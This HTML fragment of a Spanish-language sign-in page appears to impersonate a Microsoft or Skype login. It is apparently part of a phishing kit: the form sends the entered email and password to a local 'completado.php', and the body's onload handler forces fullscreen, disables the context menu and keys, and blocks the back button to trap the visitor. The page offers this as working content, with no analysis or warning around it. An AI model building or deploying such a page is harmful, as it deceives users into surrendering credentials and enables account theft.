...
<body onload="fullScreen(); disableContext(); disableKeys(); javascript:history.go(1)">
    ...
    <br>
    <br>
		<h2 class="titlex">Iniciar sesión</h2>

		<form action="completado.php" method="POST">
			<input type="email" class="imput" name="usec" id="usec" placeholder="Correo electrónico, teléfono o Skype" required="required" autocorrect="nop" autocapitalize="none" spellcheck="false" inputmode="text">
      <br>
			<input id="clave" class="imput" type="password" name="clave" placeholder="Contraseña" autocorrect="nop" autocapitalize="none" spellcheck="false" inputmode="text" required="required" minlength="6">
      <br><br>
			<input type="submit" class="boton" value="Siguiente">
		</form>
	</div>
                 <img src="opciones.png"  alt="">               
                            </div>
                        </div>
